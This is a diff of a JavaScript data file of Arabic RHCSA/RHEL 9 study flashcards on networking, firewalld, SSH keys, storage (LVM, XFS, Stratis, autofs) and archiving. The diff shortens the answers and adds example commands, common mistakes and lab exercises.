                 cat: "6️⃣ الشبكات",
-                q: `ما هو التحول الجذري in RHEL 9 لإدارة الشبكة؟`,
-                a: `<strong>التغيير الهيكلي لإعدادات كروت الشبكة في RHEL 9:</strong><br>تم إلغاء واستبعاد كود التهيئة القديم المبني على ملفات <code>ifcfg-*</code> النصية في المسار <code>/etc/sysconfig/network-scripts/</code>. والآن يعتمد النظام بالكامل على تنسيق **Keyfile** القياسي ويقوم بحفظ جميع إعدادات الشبكة في مسار جديد كلياً:<br><code>/etc/NetworkManager/system-connections/</code>`
+                difficulty: "Advanced",
+                tags: ['Networking'],
+                usedIn: ['RHCSA'],
+                q: `ما هو التحول الجذري في RHEL 9 لإدارة الشبكة؟`,
+                a: `التخلي عن ملفات ifcfg في /etc/sysconfig/network-scripts/ والاعتماد الكامل على keyfile في /etc/NetworkManager/system-connections/.`,
+                example: `cat /etc/NetworkManager/system-connections/eth0.nmconnection`,
+                mistakes: `محاولة تعديل ملفات ifcfg القديمة في RHEL 9 دون جدوى؛ حيث تم ترحيل التكوين بالكامل لصيغة keyfile.`,
+                lab: `تصفح مسار تكوين الاتصالات الجديد واطلع على ملف الكرت الرئيسي.`,
+                ref: `RHEL 9 Networking Administration Guide`,
+                related: ['nmcli', 'nmtui']
             },
             {
                 id: 34,
                 cat: "6️⃣ الشبكات",
+                difficulty: "Advanced",
+                tags: ['Networking'],
+                usedIn: ['RHCSA'],
                 q: `ما هو NetworkManager keyfile؟`,
-                a: `<strong>التنسيق الجديد لملفات تكوين الكروت:</strong><br>هو ملف نصي منظم بصيغة ملفات تكوين <code>.INI</code> التقليدية ويحمل الامتداد <code>.nmconnection</code>. يحتوي على أقسام واضحة للتهيئة مثل <code>[connection]</code> و <code>[ipv4]</code> لتحديد العناوين الثابتة والبوابة الافتراضية والخوادم دون تعقيد.`
+                a: `تنسيق INI لتخزين إعدادات الاتصالات (IP, Gateway, DNS) بصيغة .nmconnection.`,
+                example: `nmcli connection show`,
+                mistakes: `كتابة إعدادات يدوية خاطئة في ملف التكوين مباشرة دون استخدام nmcli للتحقق.`,
+                lab: `افحص تكوين الاتصال الحالي وعناوين الـ IP بصيغة keyfile.`,
+                ref: `NetworkManager.conf Reference`,
+                related: ['nmcli', 'ip addr']
             },
             {
                 id: 35,
                 cat: "6️⃣ الشبكات",
+                difficulty: "Advanced",
+                tags: ['Networking'],
+                usedIn: ['RHCSA'],
                 q: `كيف ترحل إعدادات ifcfg القديمة إلى keyfile؟`,
-                a: `<strong>أداة الترحيل التلقائي في NetworkManager:</strong><br>لتحديث ملفات الكروت القديمة المتواجدة بالنظام وترحيلها للصيغة الجديدة بدون كتابتها يدوياً، ننفذ الأمر التالي:<br><code>nmcli connection migrate</code><br>سيقوم النظام بتحويل كافة الملفات للامتداد <code>.nmconnection</code> ونقلها للمسار الجديد تلقائياً وبأمان.`
+                a: `nmcli connection migrate`,
+                example: `nmcli connection migrate`,
+                mistakes: `حذف الملفات القديمة بالخطأ بدلاً من عمل ترحيل آمن وتلقائي للـ keyfile.`,
+                lab: `قم بتنفيذ أمر الترحيل للتأكد من تحويل الملفات القديمة إلى keyfile بنجاح.`,
+                ref: `nmcli migration command documentation`,
+                related: ['nmcli', 'systemctl reload NetworkManager']
             },
             {
                 id: 36,
                 cat: "6️⃣ الشبكات",
+                difficulty: "Intermediate",
+                tags: ['Networking'],
+                usedIn: ['RHCSA'],
                 q: `ما هي أدوات إدارة الشبكة في RHEL 9؟`,
-                a: `<strong>التحكم في الاتصالات وإعدادات الشبكة:</strong><br><ul><li><code>nmcli</code>: واجهة سطر الأوامر الأقوى لإضافة وتعديل وحذف وتفعيل كروت الشبكة.</li><li><code>nmtui</code>: واجهة رسومية نصية تفاعلية داخل الشل تناسب التعديل السريع بدون حفظ معاملات الأوامر.</li><li>الأمر <code>ip</code> (حزمة iproute2): لاستعراض حالة الكروت وعناوين الـ IP الحالية وجداول التوجيه لحظياً.</li></ul>`
+                a: `nmcli (CLI), nmtui (TUI), nm-connection-editor (GUI), ip (iproute2).`,
+                example: `nmcli connection modify eth0 ipv4.addresses 192.168.1.10/24`,
+                mistakes: `كتابة الأوامر يدوياً وتجاوز واجهة nmtui المسهلة للمبتدئين.`,
+                lab: `افتح واجهة <code>nmtui</code> الرسومية السطرية وقم بتعديل الـ IP لكرت افتراضي.`,
+                ref: `man nmcli / man nmtui`,
+                related: ['ip', 'ping']
             },
             {
                 id: 37,
                 cat: "6️⃣ الشبكات",
+                difficulty: "Advanced",
+                tags: ['Networking'],
+                usedIn: ['RHCSA'],
                 q: `ما هي صلاحيات ملفات keyfile الموصى بها؟`,
-                a: `<strong>حماية وتأمين ملفات التكوين الحساسة:</strong><br>نظراً لأن ملفات الشبكة تحتفظ ببيانات بالغة السرية (مثل كلمات مرور شبكات الواي فاي، ومفاتيح فك تشفير الـ VPN، وشهادات الأمان)، يجب حماية الصلاحيات بحيث لا يمكن قراءتها إلا من الـ root:<br><code>chmod 600 /etc/NetworkManager/system-connections/*</code>`
+                a: `chmod 600 لمنع تسريب كلمات مرور الشبكة.
+7️⃣ جدار الحماية والوصول عن بعد`,
+                example: `chmod 600 /etc/NetworkManager/system-connections/*`,
+                mistakes: `ترك الصلاحيات مفتوحة مما يسمح لأي مستخدم محلي بقراءة كلمات السر للشبكة.`,
+                lab: `تحقق من صلاحيات ملف التكوين للكرت واضبطها لتكون محصورة لـ root فقط.`,
+                ref: `NetworkManager Security Guide`,
+                related: ['chmod', 'ls -l']
             },
             {
                 id: 38,
                 cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Intermediate",
+                tags: ['Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما هو firewalld وما هي Zones؟`,
-                a: `<strong>مفهوم المناطق الأمنية في جدار الحماية firewalld:</strong><br>هو جدار الحماية الديناميكي الافتراضي للنظام. يعتمد على تصنيف اتصالات الشبكة في **Zones (مناطق)** لتحديد مستوى الأمان المطلوب لكل كرت شبكة:<br><ul><li><code>public</code>: المنطقة الافتراضية؛ تسمح فقط بخدمات محددة يدوياً مثل SSH وتحجب الباقي.</li><li><code>drop</code>: تسقط تماماً أي حزم بيانات واردة بدون إرجاع أي رسالة خطأ للمرسل.</li><li><code>trusted</code>: منطقة أمان كاملة تقبل كافة الاتصالات الواردة دون قيود.</li></ul>`
+                a: `مدير جدار الحماية يصنف حركة المرور حسب الثقة:
+public — الافتراضية
+drop — إسقاط الحزم بدون رد
+trusted — قبول كل الاتصالات
+internal, work, home, block`,
+                example: `firewall-cmd --get-active-zones`,
+                mistakes: `تطبيق القواعد على كرت شبكة دون معرفة المنطقة (Zone) النشطة والمرتبطة به.`,
+                lab: `اعرض المناطق النشطة بجدار الحماية وحدد الكرت الخاص بك.`,
+                ref: `man firewalld`,
+                related: ['firewall-cmd', 'nftables']
             },
             {
                 id: 39,
                 cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Intermediate",
+                tags: ['Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما الفرق بين --permanent و Runtime في firewalld؟`,
-                a: `<strong>مستويات حفظ وتطبيق قواعد الحماية:</strong><br><ul><li><strong>Runtime (مستوى الذاكرة):</strong> يتم تطبيق القاعدة فوراً بالذاكرة العشوائية وتفعل لحماية النظام مؤقتاً، ولكنها **تختفي تماماً وتتلاشى** بمجرد إعادة تشغيل النظام أو إعادة تحميل الجدار.</li><li><strong>--permanent (مستوى القرص):</strong> تكتب القواعد داخل ملفات التكوين الدائمة على القرص، ولكنها لا تفعل إلا بعد تحديث القواعد بالذاكرة عن طريق أمر: <code>firewall-cmd --reload</code>.</li></ul>`
+                a: `بدون --permanent = يختفي بعد إعادة التشغيل. مع --permanent + firewall-cmd --reload = دائم.`,
+                example: `firewall-cmd --permanent --add-service=http && firewall-cmd --reload`,
+                mistakes: `كتابة القواعد في الذاكرة الحالية فقط وتوقع بقائها نشطة بعد إعادة التشغيل.`,
+                lab: `أضف منفذاً لجدار الحماية بصيغة دائمة وتأكد من بقائه بعد عمل reload.`,
+                ref: `firewall-cmd manual`,
+                related: ['firewall-cmd --list-all', 'iptables']
             },
             {
                 id: 40,
                 cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Intermediate",
+                tags: ['Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `كيف تضيف خدمة بشكل دائم في firewalld؟`,
-                a: `<strong>تفعيل الخدمات والاتصالات بشكل دائم:</strong><br>لإضافة خدمة (مثل خادم الويب HTTP) لتمر عبر جدار الحماية بشكل دائم، ننفذ التالي:<br><code>sudo firewall-cmd --permanent --add-service=http</code><br>ثم نقوم بإعادة تحميل الإعدادات لتفعيلها في الذاكرة الحالية:<br><code>sudo firewall-cmd --reload</code>`
+                a: `firewall-cmd --permanent --add-service=http ثم firewall-cmd --reload`,
+                example: `firewall-cmd --permanent --add-service=http`,
+                mistakes: `نسيان تنفيذ أمر <code>--reload</code> بعد إضافة القواعد الدائمة فلا تفعل فوراً.`,
+                lab: `أضف خدمة HTTP لجدار الحماية بشكل دائم ثم فعلها فورياً بالـ reload.`,
+                ref: `firewall-cmd services reference`,
+                related: ['firewall-cmd', 'systemctl restart firewalld']
             },
             {
                 id: 41,
                 cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Intermediate",
+                tags: ['SSH'],
+                usedIn: ['RHCSA'],
                 q: `ما هو SSH وما هي المصادقة بالمفاتيح؟`,
-                a: `<strong>الاتصال المشفر بالمفاتيح الرقمية (SSH Key-Based Auth):</strong><br>بروتوكول Secure Shell لتأمين الاتصال البعيد بالسيرفرات. المصادقة بالمفاتيح هي بديل فائق الأمان لكلمات المرور التقليدية العرضة للتخمين؛ وتعتمد على خوارزميات التشفير غير المتماثل بتوليد زوج مفاتيح (مفتاح عام ومفتاح خاص) للمصادقة تلقائياً.`
+                a: `Secure Shell — بروتوكول إدارة عن بعد. المصادقة بالمفاتيح: ssh-keygen (توليد زوج مفاتيح) + ssh-copy-id (نسخ المفتاح العام).`,
+                example: `ssh-keygen -t rsa -b 4096\nssh-copy-id user@server`,
+                mistakes: `مشاركة المفتاح الخاص (Private Key) بدلاً من المفتاح العام (Public Key).`,
+                lab: `ولد مفاتيح تشفير محلياً وانسخ المفتاح العام لسيرفر افتراضي وتأكد من الدخول بدون باسورد.`,
+                ref: `man ssh-keygen / man ssh-copy-id`,
+                related: ['ssh', 'sshd']
             },
             {
                 id: 42,
                 cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Intermediate",
+                tags: ['SSH'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين المفتاح العام والخاص في SSH؟`,
-                a: `<strong>زوج مفاتيح التشفير والمصادقة (SSH Keypair):</strong><br><ul><li><strong>المفتاح الخاص (Private Key):</strong> يُحفظ بشكل سري للغاية ومحمي على جهازك الشخصي (العميل) ولا يتم مشاركته أو إرساله لأي خادم أبداً.</li><li><strong>المفتاح العام (Public Key):</strong> يتم رفعه ونسخه على الخوادم البعيدة التي ترغب في الدخول إليها، ويتم إلحاقه داخل ملف الحماية <code>~/.ssh/authorized_keys</code> للمستخدم المستهدف.</li></ul>`
+                a: `المفتاح الخاص (id_rsa) — على جهاز المسؤول (يحفظ بسرية). المفتاح العام (id_rsa.pub) — على الخادم الهدف.`,
+                example: `cat ~/.ssh/id_rsa.pub # المفتاح العام`,
+                mistakes: `رفع المفتاح الخاص <code>id_rsa</code> إلى السيرفرات مما يشكل خطراً أمنياً جسيماً.`,
+                lab: `افحص محتويات مجلد <code>~/.ssh/</code> وتعرف على المفتاح العام والخاص.`,
+                ref: `OpenSSH Key Management`,
+                related: ['ssh', 'scp']
             },
             {
                 id: 43,
                 cat: "7️⃣ جدار الحماية والوصول عن بعد",
+                difficulty: "Advanced",
+                tags: ['SSH'],
+                usedIn: ['RHCSA'],
                 q: `ما هي Passphrase في SSH Keys؟`,
-                a: `<strong>طبقة الحماية المضافة للمفتاح الخاص:</strong><br>هي عبارة مرور أو كلمة سر إضافية يتم إدخالها عند توليد زوج المفاتيح؛ وظيفتها تشفير وحماية ملف المفتاح الخاص المخزن على قرص جهازك الشخصي. في حال تم اختراق جهازك وسرقة ملف المفتاح الخاص، لا يمكن للمخترق استخدامه للاتصال بالسيرفرات دون فك تشفيره بالـ Passphrase.`
+                a: `عبارة مرور إضافية لحماية المفتاح الخاص حتى لو سرق.
+8️⃣ التخزين`,
+                example: `ssh-keygen -p # لتغيير عبارة المرور للمفتاح الخاص`,
+                mistakes: `استخدام مفتاح بدون Passphrase؛ فإذا سرق المفتاح سيتمكن المهاجم من ولوج كافة السيرفرات فوراً.`,
+                lab: `قم بحماية مفتاحك الخاص بعبارة مرور قوية وتأكد من طلبها عند الاتصال.`,
+                ref: `SSH Security Best Practices`,
+                related: ['ssh-agent', 'ssh-add']
             },
             {
                 id: 44,
                 cat: "8️⃣ التخزين",
+                difficulty: "Intermediate",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين MBR و GPT؟`,
-                a: `<strong>تنسيقات جداول تقسيم الأقراص الصلبة (Partitioning Schemes):</strong><br><ul><li><strong>MBR (Master Boot Record):</strong> تنسيق قديم؛ يدعم حتى <code>4</code> أقسام رئيسية فقط كحد أقصى، ولا يمكنه التعامل مع أقراص تزيد سعتها عن <code>2 تيرا بايت</code>.</li><li><strong>GPT (GUID Partition Table):</strong> تنسيق حديث؛ يدعم لغاية <code>128</code> قسماً رئيسياً، وسعات تخزينية ضخمة جداً، ويدعم التحقق التلقائي من سلامة جدول التقسيم ومنع التخريب باستخدام الـ CRC Checksums.</li></ul>`
+                a: `MBR — 4 أقسام أساسية كحد أقصى، 2TB سعة. GPT — 128 قسماً، 8 ZB، UEFI، Checksums.`,
+                example: `parted /dev/sdb print`,
+                mistakes: `تقسيم قرص بحجم 4TB بنظام تقسيم MBR القديم مما يضيع نصف مساحته تقريباً.`,
+                lab: `افحص القرص الصلب وحدد نظام التقسيم الحالي (GPT أم MBR).`,
+                ref: `man parted`,
+                related: ['fdisk', 'gdisk']
             },
             {
                 id: 45,
                 cat: "8️⃣ التخزين",
+                difficulty: "Intermediate",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `ما هي أداة التقسيم الحديثة في RHEL؟`,
-                a: `<strong>برمجيات تقسيم وحدات التخزين:</strong><br><ul><li>أداة <code>parted</code>: الأداة القياسية والحديثة لإدارة الأقراص وجداول التقسيم MBR و GPT، وتدعم التقسيم المباشر غير التفاعلي.</li><li>أداة <code>fdisk</code>: الأداة الكلاسيكية الشهيرة، تم تحديثها بالكامل في RHEL 9 وأصبحت تدعم تقسيم أقراص GPT الحديثة بكفاءة.</li></ul>`
+                a: `parted (تدعم MBR و GPT). fdisk يدعم GPT أيضاً في الإصدارات الحديثة.`,
+                example: `parted /dev/sdb mklabel gpt`,
+                mistakes: `استخدام fdisk التقليدي وتجاوز parted الموصى به لإدارة GPT برمجياً.`,
+                lab: `قم بتهيئة قرص فارغ وجدولة تقسيماته بصيغة GPT باستخدام <code>parted</code>.`,
+                ref: `parted partitions guide`,
+                related: ['fdisk', 'lsblk']
             },
             {
                 id: 46,
                 cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `ما هو نظام الملفات الافتراضي في RHEL؟`,
-                a: `<strong>نظام ملفات XFS الافتراضي:</strong><br>هو نظام الملفات الافتراضي المعتمد في RHEL 9 لتهيئة الأقراص. يتميز بقدرة معالجة هائلة للملفات الضخمة وموثوقية عالية جداً بفضل الـ metadata journaling. **تنبيه هام للمهندسين:** نظام XFS لا يدعم ميزة التقليص (Shrink) نهائياً، ويمكن فقط زيادة مساحته وحجمه (Grow).`
+                a: `XFS — أداء عالي وموثوقية. لا يدعم التقليص (Shrink)!`,
+                example: `mkfs.xfs /dev/sdb1`,
+                mistakes: `تخطيط مساحة LVM وتوقع إمكانية تقليص حجم XFS لاحقاً؛ XFS لا يمكن تقليسه أبداً.`,
+                lab: `أنشئ قسم XFS جديد وتحقق من إمكانية زيادته وعدم إمكانية تصغيره.`,
+                ref: `man mkfs.xfs`,
+                related: ['xfs_growfs', 'mount']
             },
             {
                 id: 47,
                 cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `كيف تُنشئ مساحة Swap؟`,
-                a: `<strong>خطوات تهيئة وتفعيل الذاكرة الافتراضية (Swap Space):</strong><br><ol><li>قم بتهيئة القسم التخزيني المخصص ليعمل كـ swap:<br><code>sudo mkswap /dev/sdb2</code></li><li>قم بتفعيل مساحة الذاكرة الافتراضية فوراً:<br><code>sudo swapon /dev/sdb2</code></li><li>لجعل التفعيل دائماً بعد إعادة التشغيل، أضف الـ UUID الخاص بالقسم في ملف <code>/etc/fstab</code> بصيغة:<br><code>UUID=xxxx  none  swap  defaults  0  0</code></li></ol>`
+                a: `mkswap /dev/sdXn ثم swapon /dev/sdXn. للدائم: أضف إلى /etc/fstab باستخدام UUID.`,
+                example: `mkswap /dev/sdb2 && swapon /dev/sdb2`,
+                mistakes: `نسيان إضافة المعرف UUID في fstab مما يؤدي لتعطيل الـ swap بعد إعادة التشغيل.`,
+                lab: `قم بتهيئة قسم swap وتفعيله وإضافته لملف fstab وتأكد بـ <code>swapon --show</code>.`,
+                ref: `man swapon / man mkswap`,
+                related: ['free -m', 'swapoff']
             },
             {
                 id: 48,
                 cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `ما هو LVM وما هي طبقاته الثلاث؟`,
-                a: `<strong>نظام إدارة الأقراص المرن (Logical Volume Manager):</strong><br>تقنية متطورة تتيح إدارة وتوسيع الأقراص الساخنة بمرونة تامة. تتكون هيكليتها من ثلاث طبقات مرتبة تصاعدياً:<br><ul><li><strong>PV (Physical Volume):</strong> تهيئة الأقراص الفيزيائية الحقيقية كأقسام LVM بأمر <code>pvcreate</code>.</li><li><strong>VG (Volume Group):</strong> دمج مجموعة من الـ PVs في مساحة تخزينية واحدة كبيرة بأمر <code>vgcreate</code>.</li><li><strong>LV (Logical Volume):</strong> اقتطاع مساحات منطقية مرنة من الـ VG بأمر <code>lvcreate</code> وتهيئتها بنظام ملفات لربطها بالنظام.</li></ul>`
+                a: `Logical Volume Manager:
+PV (Physical Volume) — pvcreate
+VG (Volume Group) — vgcreate
+LV (Logical Volume) — lvcreate`,
+                example: `pvcreate /dev/sdb1\nvgcreate vg_data /dev/sdb1\nlvcreate -n lv_files -L 10G vg_data`,
+                mistakes: `الخلط بين طبقات LVM ومحاولة إنشاء Logical Volume مباشرة دون إنشاء VG أولاً.`,
+                lab: `قم بإنشاء وتكوين دورة LVM كاملة من القرص الصلب وحتى المجلد المنطقي.`,
+                ref: `man lvm`,
+                related: ['pvdisplay', 'vgdisplay', 'lvdisplay']
             },
             {
                 id: 49,
                 cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `كيف توسع LV على XFS؟`,
-                a: `<strong>خطوات التوسيع الحي للمساحة بدون حظر أو إيقاف السيرفر:</strong><br><ol><li>قم بزيادة وتوسيع المجلد المنطقي الحاضن للمساحة:<br><code>sudo lvextend -L +10G /dev/vgname/lvname</code></li><li>قم بعملية تمديد نظام الملفات XFS الحي والموصول لقراءة المساحة الجديدة فوراً:<br><code>sudo xfs_growfs /mount/point</code></li></ol>`
+                a: `lvextend -L +10G /dev/vg_name/lv_name ثم xfs_growfs /mount/point`,
+                example: `lvextend -L +5G /dev/vg_data/lv_files && xfs_growfs /mnt/files`,
+                mistakes: `توسيع الـ Volume المنطقي (lvextend) ونسيان توسيع نظام الملفات (xfs_growfs).`,
+                lab: `قم بزيادة مساحة مجلد LVM موصول بالنظام حياً وتحقق من انعكاس المساحة بـ <code>df -h</code>.`,
+                ref: `man xfs_growfs / man lvextend`,
+                related: ['resize2fs', 'df']
             },
             {
                 id: 50,
                 cat: "8️⃣ التخزين",
+                difficulty: "Expert",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `ما هو Stratis وما ميزته؟`,
-                a: `<strong>نظام إدارة التخزين الذكي والمبسط (Stratis Storage):</strong><br>محرك إدارة متكامل يدمج ويسهل استخدام تقنيات LVM ونظام ملفات XFS تحت واجهة برمجية واحدة. ميزاته الأساسية:<br><ul><li><strong>Thin Provisioning الذاتي:</strong> تخصيص مساحة تخزين مرنة.</li><li><strong>النسخ الاحتياطي اللحظي (Snapshots):</strong> أخذ لقطات فورية واستعادتها بسهولة.</li><li><strong>إدارة التجميعات (Storage pools):</strong> زيادة سعة التخزين بإضافة أقراص للـ pool مباشرة دون إعادة تقسيمها.</li></ul>`
+                a: `إطار تخزين حديث يعتمد على Thin Provisioning وأتمتة LVM/XFS. يدعم Snapshots.`,
+                example: `stratis pool create my_pool /dev/sdb\nstratis filesystem create my_pool fs_files`,
+                mistakes: `تهيئة القرص يدوياً قبل إضافته لـ Stratis؛ الأداة تتطلب قرصاً فارغاً بالكامل لتهيئته تلقائياً.`,
+                lab: `أنشئ تجميعة Stratis وقسم ملفات ذكي وتحقق من تفعيله.`,
+                ref: `man stratis`,
+                related: ['stratisd', 'mount']
             },
             {
                 id: 51,
                 cat: "8️⃣ التخزين",
+                difficulty: "Expert",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `ما هو Thin Provisioning؟`,
-                a: `<strong>التخصيص التخزيني الافتراضي المرن:</strong><br>تقنية متطورة لحجز وتخصيص المساحات بشكل ديناميكي؛ حيث يرى نظام التشغيل حجماً وهمياً كبيراً للقسم (مثل 50GB)، ولكن لا يتم حجز أو استهلاك أي مساحة حقيقية من الأقراص الفيزيائية إلا عند كتابة البيانات الفعلية عليها بالفعل، مما يوفر استغلالاً مثالياً للأقراص.`
+                a: `تخصيص ظاهري — نظام ملفات يبدو بحجم هائل لكنه يستهلك فقط المساحة الفعلية المكتوبة.`,
+                example: `Stratis Thin Provisioning Concept`,
+                mistakes: `الاعتقاد بأن مساحة التخزين محجوزة مسبقاً بالكامل على القرص؛ هي مساحة وهمية تستهلك الفعلي فقط.`,
+                lab: `افحص استهلاك مساحة Stratis الحقيقية مقابل الافتراضية بـ <code>stratis pool list</code>.`,
+                ref: `RHEL Stratis Storage Management`,
+                related: ['stratis pool', 'stratis fs']
             },
             {
                 id: 52,
                 cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `ما هو NFS وما هو Autofs؟`,
-                a: `<strong>مشاركة التخزين والتركيب التلقائي عبر الشبكة:</strong><br><ul><li><code>NFS</code> (Network File System): بروتوكول لمشاركة المجلدات والملفات مع السيرفرات الأخرى كأنها أقراص محلية.</li><li><code>Autofs</code>: خدمة ذكية تقوم بتركيب وربط مشاركات الملفات (Mount) تلقائياً عند طلبها أو الولوج إليها فقط (On-demand)، وتقوم بفصلها ذاتياً (Unmount) بعد فترة خمول محددة لتوفير موارد الشبكة والأمان.</li></ul>`
+                a: `NFS — مشاركة ملفات عبر الشبكة. Autofs — تركيب تلقائي عند الطلب (On-demand) وفك الارتباط بعد فترة الخمول.`,
+                example: `systemctl start autofs`,
+                mistakes: `ترك اتصالات NFS معلقة ومفتوحة بشكل دائم بدون استخدام autofs مما يبطئ السيرفر.`,
+                lab: `ثبت خدمة <code>autofs</code> وقم بتهيئة تركيب تلقائي لمجلد بعيد.`,
+                ref: `man autofs`,
+                related: ['mount', 'showmount']
             },
             {
                 id: 53,
                 cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `كيف تُعد Autofs؟`,
-                a: `<strong>خطوات تهيئة الربط الديناميكي للملفات:</strong><br><ol><li>أضف مسار المجلد الرئيسي والملف المرجعي في <code>/etc/auto.master.d/share.autofs</code>:<br><code>/mnt/shares /etc/auto.share</code></li><li>أنشئ ملف التكوين الفرعي <code>/etc/auto.share</code> وضبط قاعدة الربط (المفتاح، خيارات التركيب، السيرفر البعيد):<br><code>work -rw,soft,intr 192.168.1.10:/data</code></li><li>قم بتشغيل وتفعيل الخدمة:<br><code>sudo systemctl enable --now autofs</code></li></ol>`
+                a: `خريطة رئيسية في /etc/auto.master.d/ + خريطة فرعية (Indirect Map) تربط مساراً محلياً بخادم بعيد.`,
+                example: `/etc/auto.master.d/direct.autofs`,
+                mistakes: `خطأ في بناء قواعد خريطة الربط الفرعية مما يؤدي لفشل خدمة autofs بالكامل.`,
+                lab: `قم بتهيئة خريطة ربط غير مباشرة (Indirect Map) لتركيب مجلد NFS تلقائياً.`,
+                ref: `Autofs Configuration Reference`,
+                related: ['automount', 'systemctl status autofs']
             },
             {
                 id: 54,
                 cat: "8️⃣ التخزين",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `ما هو UUID ولماذا نستخدمه في /etc/fstab؟`,
-                a: `<strong>المعرف الفريد العالمي للأقسام (UUID):</strong><br>هو رمز تعريفي فريد وموحد عالمياً يسند لكل نظام ملفات عند تهيئته. نستخدمه في ملف التهيئة الرئيسي <code>/etc/fstab</code> بدلاً من مسارات الأقراص (مثل <code>/dev/sda1</code>) لأن مسارات الأجهزة قد تتغير أو تتبدل عند تغيير ترتيب كابلات الأقراص أو منافذ السيرفر، بينما الـ UUID يضمن استقرار ربط القسم الصحيح دائماً.`
+                a: `معرف فريد عالمي — يضمن عدم تأثر التركيب بتغير مسارات الأجهزة (مثل /dev/sda → /dev/sdb).
+9️⃣ الأرشفة والجدولة`,
+                example: `blkid /dev/sdb1`,
+                mistakes: `كتابة مسار القرص مثل /dev/sdb1 في fstab؛ فإذا تغير ترتيب الأقراص سيفشل النظام بالإقلاع تماماً.`,
+                lab: `احصل على الـ UUID لقسم تخزيني واستخدمه لتثبيته في fstab بشكل آمن ودائم.`,
+                ref: `man blkid / man fstab`,
+                related: ['mount -a', 'findmnt']
             },
             {
                 id: 55,
                 cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Beginner",
+                tags: ['Filesystem'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين tar و gzip؟`,
-                a: `<strong>أرشفة الملفات مقابل ضغط الحجم:</strong><br><ul><li><code>tar</code> (Tape Archiver): أداة تقوم <strong>بتجميع وحزم</strong> مجموعة من الملفات والمجلدات ودمجها في ملف واحد أرشيفي بالامتداد <code>.tar</code> دون تغيير حجمها أو ضغطها.</li><li><code>gzip</code>: أداة متخصصة في <strong>ضغط حجم الملفات</strong> لتقليص مساحة التخزين وتنتج ملفات بامتداد <code>.gz</code> (ولا يمكنها دمج عدة ملفات منفصلة في ملف واحد بمفردها).</li></ul>`
+                a: `tar — جمع ملفات في أرشيف واحد. gzip/bzip2/xz — ضغط الأرشيف.`,
+                example: `tar -cf archive.tar /source_dir\ngzip archive.tar`,
+                mistakes: `الاعتقاد بأن tar يضغط الحجم تلقائياً؛ tar يجمع الملفات فقط ويجب استخدام gzip للضغط.`,
+                lab: `أنشئ أرشيفاً بـ tar ثم قم بضغطه بـ gzip لملاحظة تغير الحجم.`,
+                ref: `man tar / man gzip`,
+                related: ['zip', 'unzip']
             },
             {
                 id: 56,
                 cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Filesystem'],
+                usedIn: ['RHCSA'],
                 q: `كيف تضغط أرشيف بأقصى ضغط؟`,
-                a: `<strong>استخدام خوارزميات الضغط العالي (xz compression):</strong><br>نستخدم أمر <code>tar</code> مدمجاً مع خوارزمية <code>xz</code> بالمعامل <code>-J</code> للحصول على أعلى نسبة ضغط ممكنة للملفات:<br><code>tar -cJf archive.tar.xz /source_folder</code><br><strong>معاني الحروف:</strong> <code>c</code> (إنشاء)، <code>J</code> (ضغط xz)، <code>f</code> (تحديد اسم ملف الأرشيف الناتج). خوارزمية xz توفر ضغطاً فائقاً مقارنة بـ gzip ولكنها تستغرق وقتاً أطول ومعالجة أعلى.`
+                a: `tar -cJf archive.tar.xz /path (xz = أعلى ضغط، أبطأ). -czf = gzip (أسرع، أقل ضغط).`,
+                example: `tar -cJf archive.tar.xz /source`,
+                mistakes: `استخدام خيار خاطئ مثل <code>-z</code> (المخصص لـ gzip) مع تسمية الملف بامتداد <code>.xz</code>.`,
+                lab: `قارن حجم وضغط أرشيف xz مقابل أرشيف gzip لنفس الملفات.`,
+                ref: `tar compression options manual`,
+                related: ['xz', 'bzip2']
             },
             {
                 id: 57,
                 cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Filesystem'],
+                usedIn: ['RHCSA'],
                 q: `ما هي ميزة rsync؟`,
-                a: `<strong>مزامنة الملفات الذكية بنظام نقل الفروقات (Delta Transfer):</strong><br>تتميز أداة <code>rsync</code> بنقل ومزامنة الملفات محلياً أو عبر الشبكة بكفاءة بالغة؛ حيث لا تقوم بإعادة نقل الملفات بالكامل بل تقوم بفحص الملفات ومقارنتها و**نقل الأجزاء والكتل المعدلة فقط** (Delta blocks)، مما يوفر الوقت واستهلاك النطاق الترددي للشبكة.`
+                a: `Delta Transfer Algorithm — ينقل الأجزاء المعدلة فقط، يوفر النطاق الترددي.`,
+                example: `rsync -avz --delete /src/ /dest/`,
+                mistakes: `نسيان الشرطة المائلة الأخيرة <code>/</code> في مسار المصدر مما يتسبب في نسخ المجلد نفسه بدلاً من محتوياته.`,
+                lab: `قم بعمل مزامنة لمجلد محلي مستخدماً rsync وتأكد من نقل الفروقات فقط.`,
+                ref: `man rsync`,
+                related: ['scp', 'cp']
             },
             {
